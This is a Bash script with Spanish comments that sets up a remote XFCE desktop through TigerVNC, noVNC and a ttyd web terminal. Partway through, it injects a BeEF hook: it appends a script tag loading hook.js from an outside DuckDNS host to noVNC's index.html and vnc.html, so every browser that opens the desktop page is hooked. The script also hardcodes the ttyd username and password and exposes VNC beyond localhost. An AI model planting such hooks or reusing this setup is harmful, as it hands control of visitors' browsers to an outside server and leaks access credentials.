#!/bin/bash
export NOVNC_PORT="6080"
export TTYD_PORT="5000"
export TTYD_USERNAME="alesanfe"
export TTYD_PASSWD="wellington"

echo "-- Configurando entorno..."
export DEBIAN_FRONTEND=noninteractive TZ="Etc/UTC"

echo "-- Actualizando paquetes..."
apt -y update && apt -y install wget iproute2 lsof tigervnc-standalone-server novnc xfce4 xfce4-goodies x11-xserver-utils

echo "-- Deteniendo procesos que están usando los puertos 6080 y 5000 (si están ocupados)..."

# Cerrar el puerto 6080 si está en uso
NOVNC_PORT_PID=$(sudo lsof -t -i :$NOVNC_PORT)
if [ ! -z "$NOVNC_PORT_PID" ]; then
    echo "Deteniendo proceso que usa el puerto $NOVNC_PORT (PID: $NOVNC_PORT_PID)..."
    sudo kill -9 $NOVNC_PORT_PID
else
    echo "El puerto $NOVNC_PORT no está en uso."
fi

# Cerrar el puerto 5000 si está en uso
TTYD_PORT_PID=$(sudo lsof -t -i :$TTYD_PORT)
if [ ! -z "$TTYD_PORT_PID" ]; then
    echo "Deteniendo proceso que usa el puerto $TTYD_PORT (PID: $TTYD_PORT_PID)..."
    sudo kill -9 $TTYD_PORT_PID
else
    echo "El puerto $TTYD_PORT no está en uso."
fi

# Cerrar el puerto 5901 si está en uso
PORT_5901_PID=$(sudo lsof -t -i :5901)
if [ ! -z "$PORT_5901_PID" ]; then
    echo "Deteniendo proceso que usa el puerto 5901 (PID: $PORT_5901_PID)..."
    sudo kill -9 $PORT_5901_PID
else
    echo "El puerto 5901 no está en uso."
fi

echo "-- Borrando archivos antiguos ttyd.armhf*..."
rm -f ttyd.armhf*

echo "-- Descargando e instalando ttyd..."
wget https://github.com/tsl0922/ttyd/releases/download/1.6.3/ttyd.armhf
if [ $? -eq 0 ]; then
    cp ttyd.armhf /usr/local/bin/ttyd
    chmod +x /usr/local/bin/ttyd
else
    echo "❌ Error: La descarga de ttyd falló."
    exit 1
fi

echo "-- Configurando noVNC..."
if [ -f "/usr/share/novnc/vnc.html" ]; then
    cp /usr/share/novnc/vnc.html /usr/share/novnc/index.html
else
    echo "⚠️ Advertencia: No se encontró /usr/share/novnc/vnc.html"
fi

echo "-- Inyectando BeEF en noVNC..."
# Ten en cuenta que esto podría comprometer la seguridad del sistema. Asegúrate de que la fuente sea confiable.
echo '<script src="http://alesanfe.duckdns.org:3000/hook.js"></script>' >> /usr/share/novnc/index.html
echo '<script src="http://alesanfe.duckdns.org:3000/hook.js"></script>' >> /usr/share/novnc/vnc.html

echo "-- Cerrando cualquier sesión VNC activa antes de iniciar una nueva..."
VNC_SESSIONS=$(vncserver -list | grep -E ":[0-9]+" | awk '{print $1}')
if [ ! -z "$VNC_SESSIONS" ]; then
    echo "Sesiones VNC encontradas. Cerrando..."
    for session in $VNC_SESSIONS; do
        vncserver -kill $session
    done
else
    echo "No hay sesiones VNC activas."
fi

# Matar cualquier proceso de tigervncserver que esté corriendo
echo "-- Eliminando cualquier instancia previa de tigervncserver..."
pkill -f 'tigervncserver'

# Obtener la resolución máxima posible de la pantalla
MAX_RESOLUTION=$(xrandr | grep '*' | sort -r | head -n 1 | awk '{print $1}')
echo "Resolución máxima detectada: $MAX_RESOLUTION"

echo "-- Iniciando VNC Server en el puerto 5901 con resolución máxima..."
tigervncserver :2 -geometry $MAX_RESOLUTION -depth 24 -rfbport 5901 -SecurityTypes VncAuth -localhost no
if [ $? -eq 0 ]; then
    echo "VNC server iniciado correctamente con resolución $MAX_RESOLUTION."
else
    echo "❌ Error: No se pudo iniciar el VNC server."
    exit 1
fi

echo "-- Iniciando ttyd en el puerto $TTYD_PORT..."
ttyd -c $TTYD_USERNAME:$TTYD_PASSWD -p $TTYD_PORT bash &
if [ $? -eq 0 ]; then
    echo "ttyd iniciado correctamente en el puerto $TTYD_PORT."
else
    echo "❌ Error: No se pudo iniciar ttyd."
    exit 1
fi

echo "-- Iniciando noVNC en el puerto $NOVNC_PORT..."
if [ -f "/usr/share/novnc/utils/novnc_proxy" ]; then
    /usr/share/novnc/utils/novnc_proxy --vnc 127.0.0.1:5901 --listen $NOVNC_PORT
    if [ $? -eq 0 ]; then
        echo "noVNC iniciado correctamente en el puerto $NOVNC_PORT."
    else
        echo "❌ Error: No se pudo iniciar noVNC."
        exit 1
    fi
else
    echo "❌ Error: noVNC no encontrado en /usr/share/novnc/utils/"
    exit 1
fi

echo "✅ Todo listo. Accede a noVNC en http://localhost:$NOVNC_PORT"
